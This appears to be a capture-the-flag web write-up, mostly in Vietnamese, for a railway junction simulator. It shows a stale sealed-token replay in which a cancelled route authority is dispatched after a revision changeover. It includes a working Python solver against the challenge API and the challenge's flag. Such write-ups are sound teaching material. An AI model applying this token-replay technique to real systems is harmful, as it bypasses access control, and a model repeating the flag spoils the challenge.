---
title: "Greyline Junction"
category: "Web"
tags: ["state-replay", "access-control"]
solve_date: "2026-10-11T09:11:00+07:00"
language: "vi"
---

# Greyline Junction

**Flag:** `isfcr{greyline_a471_stale_1818abfe_card}`
**Artifact:** `FIELD_GUIDE.md` (2,483 bytes), remote service `https://isfcrpesu-greyline-junction.chals.io`
| Artifact | SHA-256 |
|---|---|
| `FIELD_GUIDE.md` | `fd0498ab166d4fa88a755831a3cb21258f80d049cae7123d41d4b62ccd62d3c5` |

## Đề bài

Tạo incident có hai train movement cùng chiếm một track circuit, dù authority của ít nhất một movement chưa reserve circuit đó. API dùng sealed state token do client gửi lại, không có session state riêng trên server.

## Phân tích

`plan` reserve `AP-0`, path và flank; `cancel` trả reservation để plan tuyến khác. `changeover` chuyển revision A sang B một lần trước khi có movement. `dispatch` chạy route theo revision hiện tại. `incident` kiểm tra collision và reservation.

Token cũ vẫn dùng được sau khi sinh token mới. Nhờ vậy có thể so scheme A/B trong cùng một board được relabel, rồi bắt đầu một chuỗi khác từ snapshot ban đầu. Sau changeover, path của route có thể khác reservation khi authority được cấp.

## Lời giải

1. Reset lấy `s0`, đọc scheme A. Fork một changeover từ `s0` để đọc scheme B; giữ `s0` cho chuỗi khai thác.
2. Chọn X và Y có path B chung circuit `c`, nhưng `c` nằm ngoài ít nhất một reservation A (`path + flank + AP-0`).
3. Từ `s0`, plan X/T1, cancel X để trả khóa, plan Y/T2, rồi changeover sang B. Hai authority không cần cùng live ở thời điểm plan.
4. Dispatch Y trước, sau đó dispatch authority X đã cancel trên state trả về. Một số session trả 403, nhưng có session chấp nhận stale card. Chạy lại chuỗi khi gặp `Authority was cancelled` hoặc incident `clear`.
5. Khi hai movement cùng được ghi trong sealed state, gọi `/api/incident`. Phản hồi `contradiction` xác nhận circuit chung chưa được reserve đầy đủ và trả flag.

Việc stale dispatch được chấp nhận không xảy ra ở mọi session. Chỉ có ciphertext token và phản hồi API, nên chưa xác định được predicate phía server gây hành vi này.

## Kết quả

Flag được đọc từ phản hồi `/api/incident` của một state đã chấp nhận stale dispatch và ghi nhận contradiction.

`isfcr{greyline_a471_stale_1818abfe_card}`

## Tái hiện

Dùng JSON client và lặp mỗi attempt với state reset riêng. Đọc hai scheme, chọn cặp tuyến, thực hiện `plan(X) → cancel → plan(Y) → changeover → dispatch(Y) → dispatch(X) → incident`. Code và phản hồi của attempt thành công được giữ dưới đây; không tái sử dụng route label từ session khác.

```python
import itertools, json, urllib.request, urllib.error

BASE = "https://isfcrpesu-greyline-junction.chals.io"

def call(path, payload):
    req = urllib.request.Request(BASE + path, data=json.dumps(payload).encode(),
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return {"_status": e.code, **json.loads(e.read().decode() or b"{}")}

def attempt():
    s0 = call("/api/reset", {})["state"]
    a = {r["id"]: r for r in call("/api/scheme", {"state": s0})["routes"]}
    b = {r["id"]: r for r in call("/api/scheme",
         {"state": call("/api/changeover", {"state": s0})["state"]})["routes"]}
    held = lambda r: set(r["path"]) | {r["flank"]} | {"AP-0"}

    pair = None
    for x, y in itertools.combinations(sorted(a), 2):
        shared = set(b[x]["path"]) & set(b[y]["path"])
        if shared and any(c not in held(a[x]) for c in shared) or \
           shared and any(c not in held(a[y]) for c in shared):
            pair = (x, y); break
    if not pair:
        return None
    x, y = pair

    p1 = call("/api/plan", {"state": s0, "train": "T1", "route": x})
    if "_status" in p1: return None
    c1 = call("/api/cancel", {"state": p1["state"], "authority": p1["authority"]})
    p2 = call("/api/plan", {"state": c1["state"], "train": "T2", "route": y})
    co = call("/api/changeover", {"state": p2["state"]})
    dl = call("/api/dispatch", {"state": co["state"], "authority": p2["authority"]})
    if "_status" in dl: return None
    dc = call("/api/dispatch", {"state": dl["state"], "authority": p1["authority"]})
    if "_status" in dc: return None            # stale-card dispatch rejected: retry
    return call("/api/incident", {"state": dc["state"]})

for _ in range(200):
    inc = attempt()
    if inc and inc.get("status") == "contradiction":
        print(inc["flag"]); break
```

```text
pair R01 R03 shared ['TC-06'] x_off True y_off False
{'circuit': 'TC-06',
 'flag': 'isfcr{greyline_a471_stale_1818abfe_card}',
 'status': 'contradiction',
 'trains': ['T1', 'T2']}
```
